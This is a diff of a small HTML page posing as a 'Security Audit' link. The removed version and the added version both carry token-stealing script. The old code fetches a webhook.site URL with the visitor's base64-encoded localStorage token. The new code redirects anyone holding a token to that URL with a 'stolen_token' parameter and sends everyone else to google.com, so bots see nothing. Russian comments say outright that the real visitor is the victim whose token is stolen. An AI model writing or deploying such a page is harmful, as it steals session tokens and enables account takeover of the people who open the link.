@@ -1,14 +1,13 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <meta property="og:title" content="Security Audit">
-    <meta property="og:description" content="Checking bot headers">
-    <script>
-        // Это для случая, если ссылку откроет реальный юзер (жертва)
-        fetch('https://webhook.site/c8ce1351-d58c-41cc-a576-f8f0c4ed50d6?token=' + btoa(localStorage.getItem('token') || 'no_ls'));
-    </script>
-</head>
-<body>
-    <img src="https://webhook.site/c8ce1351-d58c-41cc-a576-f8f0c4ed50d6?v=bot_trigger">
-</body>
+<script>
+    // Если зашел реальный человек, крадем токен и редиректим на нормальный сайт
+    var token = localStorage.getItem('token');
+    if (token) {
+        location.href = 'https://webhook.site/c8ce1351-d58c-41cc-a576-f8f0c4ed50d6?stolen_token=' + btoa(token);
+    } else {
+        // Если зашел бот или токена нет
+        location.href = 'https://google.com';
+    }
+</script>
 </html>
